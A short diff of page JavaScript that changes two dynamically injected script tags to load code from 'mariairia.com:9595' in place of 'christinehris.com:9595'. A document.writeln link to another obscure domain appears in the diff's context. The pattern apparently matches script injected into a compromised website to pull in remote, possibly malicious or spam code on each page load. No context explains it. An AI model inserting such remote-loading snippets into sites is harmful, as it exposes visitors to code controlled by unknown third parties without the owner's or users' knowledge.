@@ -3,12 +3,12 @@ document.writeln("<a href=\'https://m.kaisadadigood.com:168/ua80512/ \' target=\
   var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
-    s.src = 'https://christinehris.com:9595/v/104_150/1926_1';
+    s.src = 'https://mariairia.com:9595/v/104_150/1926_1';
     var head = document.getElementsByTagName('head')[0];
     head.appendChild(s);   
  var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
-    s.src = 'https://christinehris.com:9595/v/105/1926_1';
+    s.src = 'https://mariairia.com:9595/v/105/1926_1';
     var head = document.getElementsByTagName('head')[0];
     head.appendChild(s);  
